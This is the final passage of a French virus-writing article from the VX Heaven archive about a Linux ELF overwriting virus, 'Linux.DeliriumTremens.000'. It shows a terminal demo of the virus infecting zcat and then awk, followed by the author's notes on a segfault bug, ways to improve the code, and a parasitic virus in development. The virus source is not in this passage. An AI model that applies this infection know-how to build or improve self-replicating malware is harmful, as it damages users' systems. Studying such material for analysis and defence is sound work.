DeliriumTremens*  DeliriumTremens.asm~  sondage.sh*  zcat*
</pre>
<p>Je vais lancer mon virus et normalement si tout le monde a suivit il va infecter zcat et zsh mais pas ypdomainname.</p>
<pre>
[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="53363e2336216321133f3223273c23">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> vx]$ ./DeliriumTremens
Linux.DeliriumTremens.000 By Emper0r

virus lançé dans le rep


[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6b0e061b0e195b192b070a1b1f041b">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> vx]$ cp /bin/awk ./

un nouveaux cobaye entre en jeux :)


[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="eb8e869b8e99db99ab878a9b9f849b">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> vx]$ ./zcat
Linux.DeliriumTremens.000 By Emper0r

zcat a bien été infecté et va infecter awk


[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="06636b7663743674466a6776726976">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> vx]$ ./awk
Linux.DeliriumTremens.000 By Emper0r

voila ca à fonctionné


[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="23464e5346511351634f4253574c53">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> vx]$ ./ypdomainname
localdomain
</pre>
<p>Ca section .data étant trop petite pour contenir le code il n'a pas étai infecter.</p>
<h2><a name="p5">V. Conclusion</a></h2>
<p>Le code comporte quelques petites astuces mais reste trés simple, il est enplus bien commenté à mon avis. J'ai essayé de supprimer un maximum les embrouilles de buffer dans la pile, on doit toujours penser a ne pas 'déséquilibrer' la pile, bien faire attention lors des sorties de fonction.</p>
<p>Il contient juste 1 petit problème : si la section .data n'est pas la 16 ème section, alors les elf infectés risquent de segfaulter ou de ne pas fonctionner si on tombe dans une section sans droits d'exécution ou d'écriture. C'est trés rare mais ca peu arriver si l'elf a été compilé avec certaines options. Il est facile de corriger ce problème mais ce virus à écrasement ne comporte que peu d'interêt ; je ne suis pas allé au bout de tout les tests, c'était juste pour le fun :)</p>
<p> Vous pouvez augmenter aussi l'espace pris dans la pile si vous avez peur que 64Ko d'espace (pour stocker les nom de fichiers de répertoire courant) ne suffisent pas.</p>
<p>Vous remarquerez aussi ma façon de bourrin pour calculer le virtual offset du début de la section .data pour l'EP, on peu arranger ca facilement aussi.</p>
<p>Un virus parasite est en cour de dévellopement avec de vraies bonnes fonctions intérrésantes, affaire a suivre ....</p>
<p>Pour discuter de virus (n'hésitez pas j'adore ca :) vous pouvez me trouver sur IRC: epiknet &amp; undernet, sinon mail: <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7a1f170a1f084a083a091f190f081f0815150e54191517">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></p>
<pre>
           &lt;&lt; He who makes a beast of himself
           gets arid of the pain of being a man &gt;&gt;
</pre>
[<a style="" href="/lib/?lang=FR&amp;index=UN#vem00">Back to index</a>] [<a href="/lib/vem00.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vem00">de</a><a href="/lib/index.php?lang=en&amp;id=vem00">en</a><a href="/lib/index.php?lang=es&amp;id=vem00">es</a><a href="/lib/index.php?lang=it&amp;id=vem00">it</a><a href="/lib/index.php?lang=fr&amp;id=vem00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vem00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vem00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vem00">ua</a></div>
</body>
</html>
